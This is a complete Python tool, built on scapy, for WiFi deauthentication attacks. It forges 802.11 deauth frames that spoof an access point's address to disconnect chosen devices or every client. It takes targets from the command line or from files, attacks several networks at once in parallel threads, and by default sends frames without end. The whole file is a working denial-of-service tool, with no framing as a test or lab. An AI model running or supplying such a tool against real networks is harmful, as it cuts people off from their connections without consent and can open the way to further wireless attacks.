import argparse
import threading
from scapy.all import *
from colorama import Fore, init
import sys

# Initialize colorama
init(autoreset=True)

# Argument parser
parser = argparse.ArgumentParser(description="WiFi Deauthentication Script")

# Positional argument for the interface
parser.add_argument('interface', type=str, help="Wireless interface in monitor mode (e.g., wlan0mon)")
parser.add_argument('-n', '--network', type=str, help="Target network MAC address(es), comma separated")
parser.add_argument('-d', '--device', type=str, help="Target device MAC address(es), comma separated")
parser.add_argument('-f', '--file', type=str, help="File containing list of target MAC addresses (one per line)")
parser.add_argument('-df', '--devices_file', type=str, help="File containing device MAC addresses (one per line)")
parser.add_argument('-nf', '--networks_file', type=str, help="File containing network MAC addresses (one per line)")
parser.add_argument('-p', '--count', type=int, default=0, help="Number of deauthentication packets to send (default=0 for infinite)")

args = parser.parse_args()

# Validation for count
if args.count < 0:
    print(Fore.RED + "Error: Packet count cannot be negative.")
    sys.exit(1)

# Function to create and send deauthentication packets
def send_deauth(network_mac, device_macs, iface=None, count=0, file_name=None):
    num_devices = len(device_macs)
    inter = 0.2 / num_devices
    inter = max(inter, 0.05)  # Minimum inter-packet interval

    if file_name:
        print(Fore.LIGHTBLUE_EX + f"\nDeauthenticating " + Fore.LIGHTGREEN_EX + str(num_devices) + Fore.LIGHTBLUE_EX + ' device(s) from file ' + Fore.LIGHTGREEN_EX + f"{file_name}" + Fore.LIGHTBLUE_EX + f" on network " + Fore.LIGHTGREEN_EX + f"{network_mac}" + Fore.LIGHTBLUE_EX + f" using interface " + Fore.LIGHTYELLOW_EX + f"{iface}" + Fore.RESET)
        print(Fore.LIGHTBLUE_EX + '\nTarget Devices:' + Fore.RESET)
        for device_mac in device_macs:
            print(Fore.LIGHTGREEN_EX + '  - ' + str(device_mac) + Fore.RESET)
    else:
        if args.networks_file:
            pass
        else:
            if device_macs == ["ff:ff:ff:ff:ff:ff"]:
                print(Fore.LIGHTBLUE_EX + f"\nDeauthenticating " + Fore.LIGHTGREEN_EX + 'all' + Fore.LIGHTBLUE_EX + ' devices on network ' + Fore.LIGHTGREEN_EX + str(network_mac) + Fore.LIGHTBLUE_EX + ' using interface ' + Fore.LIGHTYELLOW_EX + str(iface) + Fore.RESET)
            else:
                print(Fore.LIGHTBLUE_EX + f"\nDeauthenticating " + Fore.LIGHTGREEN_EX + str(num_devices) + Fore.LIGHTBLUE_EX + ' device(s) on network ' + Fore.LIGHTGREEN_EX + str(network_mac) + Fore.LIGHTBLUE_EX + ' using interface ' + Fore.LIGHTYELLOW_EX + str(iface) + Fore.RESET)
                print(Fore.LIGHTBLUE_EX + '\nTarget Devices:' + Fore.RESET)
                for device_mac in device_macs:
                    print(Fore.LIGHTGREEN_EX + '  - ' + str(device_mac) + Fore.RESET)

    # Create and send deauth packets
    packets = []
    for device_mac in device_macs:
        packet = RadioTap()/Dot11(addr1=device_mac, addr2=network_mac, addr3=network_mac)/Dot11Deauth(reason=7)
        packets.append(packet)

    try:
        if count == 0:
            while True:
                for packet in packets:
                    sendp(packet, iface=iface, count=1, inter=inter, verbose=0)
        else:
            for _ in range(count):
                for packet in packets:
                    sendp(packet, iface=iface, count=1, inter=inter, verbose=0)
    except KeyboardInterrupt:
        print(Fore.RED + f"\nDeauthentication for network {network_mac} interrupted.")

# Function to handle deauthenticating multiple devices from a file
def deauth_from_file(network_mac, file_name, iface=None, count=0):
    try:
        with open(file_name, 'r') as file:
            devices = file.read().splitlines()
            send_deauth(network_mac, device_macs=devices, iface=iface, count=count, file_name=file_name)
    except FileNotFoundError:
        print(Fore.RED + f"Error: File {file_name} not found")
        sys.exit(1)

# Function to deauthenticate all devices in multiple networks from a file (using multithreading)
def deauth_from_networks_file(networks_file, iface=None, count=0):
    try:
        with open(networks_file, 'r') as file:
            networks = file.read().splitlines()

            print(Fore.LIGHTBLUE_EX + f"\nDeauthenticating " + Fore.LIGHTGREEN_EX + 'all' + Fore.LIGHTBLUE_EX + " networks from file " + Fore.LIGHTGREEN_EX + f"{networks_file}" + Fore.LIGHTBLUE_EX + f" using interface " + Fore.LIGHTYELLOW_EX + f"{iface}" + Fore.RESET)

            print(Fore.LIGHTBLUE_EX + "\nTargeted networks:")
            for network_mac in networks:
                print(Fore.LIGHTGREEN_EX + f"  - {network_mac}")

            # Create a thread for each network deauthentication
            threads = []
            for network_mac in networks:
                t = threading.Thread(target=send_deauth, args=(network_mac, ["ff:ff:ff:ff:ff:ff"], iface, count))
                threads.append(t)
                t.start()

            # Wait for all threads to complete
            for t in threads:
                t.join()

    except FileNotFoundError:
        print(Fore.RED + f"Error: File {networks_file} not found")
        sys.exit(1)

# Process deauthentication requests
if args.network:
    network_macs = args.network.split(',')
    for network_mac in network_macs:
        if args.device:
            device_macs = args.device.split(',')
            send_deauth(network_mac, device_macs=[mac.strip() for mac in device_macs], iface=args.interface, count=args.count)

        elif args.file:
            deauth_from_file(network_mac, args.file, iface=args.interface, count=args.count)

        elif args.devices_file:
            deauth_from_file(network_mac, args.devices_file, iface=args.interface, count=args.count)

        else:
            send_deauth(network_mac, device_macs=["ff:ff:ff:ff:ff:ff"], iface=args.interface, count=args.count)

elif args.networks_file:
    deauth_from_networks_file(args.networks_file, iface=args.interface, count=args.count)

else:
    print(Fore.RED + "Error: You must specify a network MAC address or provide a networks/devices file.")
    sys.exit(1)
